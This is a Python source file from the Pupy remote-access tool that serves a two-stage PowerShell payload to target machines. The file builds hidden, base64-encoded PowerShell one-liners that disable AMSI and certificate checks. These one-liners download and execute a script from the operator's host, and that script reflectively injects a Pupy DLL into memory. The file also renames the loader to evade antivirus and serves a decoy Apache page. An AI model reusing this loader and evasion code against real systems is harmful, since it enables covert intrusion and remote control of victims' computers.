#!/usr/bin/env python
# -*- coding: utf-8 -*-
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SocketServer import ThreadingMixIn
import os.path
from pupylib.utils.term import colorize
import random, string
from pupygen import generate_binary_from_template
from pupylib.PupyConfig import PupyConfig
from ssl import wrap_socket
from base64 import b64encode
import re
from pupylib.PupyCredentials import Credentials
import tempfile
import ssl

from modules.lib.windows.powershell import obfuscatePowershellScript, obfs_ps_script

ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))

#url_random_one = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
#url_random_two = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))

### "url_random_one" and "url_random_two" variables are fixed because if you break you ps1_listener listener, the ps1_listener payload will not be able to get stages -:(
url_random_one = "eiloShaegae1"
url_random_two = "IMo8oosieVai"

APACHE_DEFAULT_404="""<html><body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added, yet.</p>
</body></html>"""

def getInvokeReflectivePEInjectionWithDLLEmbedded(payload_conf):
    '''
    Return source code of InvokeReflectivePEInjection.ps1 script with pupy dll embedded
    Ready for executing
    '''
    SPLIT_SIZE = 100000
    x86InitCode, x86ConcatCode = "", ""
    code = """
    $PEBytes = ""
    {0}
    $PEBytesTotal = [System.Convert]::FromBase64String({1})
    Invoke-ReflectivePEInjection -PEBytes $PEBytesTotal -ForceASLR
    """#{1}=x86dll
    binaryX86=b64encode(generate_binary_from_template(payload_conf, 'windows', arch='x86', shared=True)[0])
    binaryX86parts = [binaryX86[i:i+SPLIT_SIZE] for i in range(0, len(binaryX86), SPLIT_SIZE)]
    for i,aPart in enumerate(binaryX86parts):
        x86InitCode += "$PEBytes{0}=\"{1}\"\n".format(i,aPart)
        x86ConcatCode += "$PEBytes{0}+".format(i)
    print(colorize("[+] ","green")+"X86 pupy dll loaded and {0} variables generated".format(i+1))
    script = obfuscatePowershellScript(open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())
    return obfs_ps_script("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1])))

def create_ps_command(ps_command, force_ps32=False, nothidden=False):
    ps_command = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
    try{{
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
    }}catch{{}}
    {}
    """.format(ps_command)

    if force_ps32:
        command = """$command = '{}'
        if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')
        {{

            $exec = $Env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded ' + $command
            IEX $exec
        }}
        else
        {{
            $exec = [System.Convert]::FromBase64String($command)
            $exec = [Text.Encoding]::Unicode.GetString($exec)
            IEX $exec
        }}""".format(b64encode(ps_command.encode('UTF-16LE')))

        if nothidden is True:
            command = 'powershell.exe -exec bypass -window maximized -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
        else:
            command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))

    else:
        if nothidden is True:
            command = 'powershell.exe -exec bypass -window maximized -encoded {}'.format(b64encode(ps_command.encode('UTF-16LE')))
        else:
            command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(ps_command.encode('UTF-16LE')))

    return command

class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # print self.server.random_reflectivepeinj_name
        if self.path=="/%s" % url_random_one:
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()

            if self.server.useTargetProxy == True:
                print colorize("[+] ","green")+"Stage 1 configured for using target's proxy configuration"
                if not self.server.sslEnabled:
                    launcher = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
                else:
                    launcher = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('https://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
            else:
                print colorize("[+] ","green")+"Stage 1 configured for NOT using target's proxy configuration"
                if not self.server.sslEnabled:
                    launcher = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
                else:
                    launcher = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('https://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)

            launcher = create_ps_command(launcher, force_ps32=True, nothidden=False)
            self.wfile.write(launcher)
            print colorize("[+] ","green")+"[Stage 1/2] Powershell script served !"

        elif self.path=="/%s" % url_random_two:
            self.send_response(200)
            self.send_header('Content-type','application/octet-stream')
            self.end_headers()
            code=open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read()
            code=code.replace("Invoke-ReflectivePEInjection", self.server.random_reflectivepeinj_name) # seems to bypass some av like avast :o)
            self.wfile.write(getInvokeReflectivePEInjectionWithDLLEmbedded(self.server.payload_conf))
            print colorize("[+] ","green")+"[Stage 2/2] Powershell Invoke-ReflectivePEInjection script (with dll embedded) served!"
            print colorize("[+] ","green")+colorize("%s:You should have a pupy shell in few seconds from this host..."%self.client_address[0],"green")

        else:
            self.send_response(404)
            self.send_header('Content-type','text/html')
            self.end_headers()
            self.wfile.write(APACHE_DEFAULT_404)

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    def set(self,conf, link_ip, port, sslEnabled, useTargetProxy):
        self.payload_conf = conf
        self.link_ip=link_ip
        self.link_port=port
        self.random_reflectivepeinj_name=''.join([random.choice(string.ascii_lowercase+string.ascii_uppercase+string.digits) for _ in range(0,random.randint(8,12))])
        self.useTargetProxy = useTargetProxy
        self.sslEnabled=sslEnabled
        if self.sslEnabled:
            credentials = Credentials()
            keystr = credentials['SSL_BIND_KEY']
            certstr = credentials['SSL_BIND_CERT']

            fd_cert_path, tmp_cert_path = tempfile.mkstemp()
            fd_key_path, tmp_key_path = tempfile.mkstemp()

            os.write(fd_cert_path, certstr)
            os.close(fd_cert_path)
            os.write(fd_key_path, keystr)
            os.close(fd_key_path)

            self.socket = wrap_socket (self.socket, certfile=tmp_cert_path, keyfile=tmp_key_path, server_side=True, ssl_version=ssl.PROTOCOL_TLSv1)
            self.tmp_cert_path=tmp_cert_path
            self.tmp_key_path=tmp_key_path


    def server_close(self):
        try:
            os.unlink(self.tmp_cert_path)
            os.unlink(self.tmp_key_path)
        except:
            pass
        self.socket.close()

def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTargetProxy=False, sslEnabled=True):
    try:
        try:
            server = ThreadedHTTPServer((ip, port),PupyPayloadHTTPHandler)
            server.set(conf, link_ip, port, sslEnabled, useTargetProxy)
        except Exception as e:
            # [Errno 98] Adress already in use
            raise

        print colorize("[+] ","green")+"copy/paste one of these one-line loader to deploy pupy without writing on the disk :"
        print " --- "
        if useTargetProxy == True:
            if not sslEnabled:
                a="iex(New-Object System.Net.WebClient).DownloadString('http://%s:%s/%s')"%(link_ip, port, url_random_one)
                b=b64encode(a.encode('UTF-16LE'))
            else:
                a="[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex(New-Object System.Net.WebClient).DownloadString('https://%s:%s/%s')"%(link_ip, port, url_random_one)
                b=b64encode(a.encode('UTF-16LE'))
            oneliner=colorize("powershell.exe -w hidden -noni -nop -enc %s"%b, "green")
            message=colorize("Please note that if the target's system uses a proxy, this previous powershell command will download/execute pupy through the proxy", "yellow")
        else:
            if not sslEnabled:
                a="$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();iex(New-Object System.Net.WebClient).DownloadString('http://%s:%s/%s')"%(link_ip, port, url_random_one)
                b=b64encode(a.encode('UTF-16LE'))
            else:
                a="$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex(New-Object System.Net.WebClient).DownloadString('https://%s:%s/%s')"%(link_ip, port, url_random_one)
                b=b64encode(a.encode('UTF-16LE'))
            oneliner=colorize("powershell.exe -w hidden -noni -nop -enc %s"%b, "green")
            message= colorize("Please note that even if the target's system uses a proxy, this previous powershell command will not use the proxy for downloading pupy", "yellow")
        print colorize("powershell.exe -w hidden -noni -nop -c \"%s\""%a, "green")
        print " --- "
        print oneliner
        print " --- "
        print message
        print " --- "

        print colorize("[+] ","green")+'Started http server on %s:%s '%(ip, port)
        print colorize("[+] ","green")+'waiting for a connection ...'
        server.serve_forever()
    except KeyboardInterrupt:
        print 'KeyboardInterrupt received, shutting down the web server'
        server.server_close()
        exit()
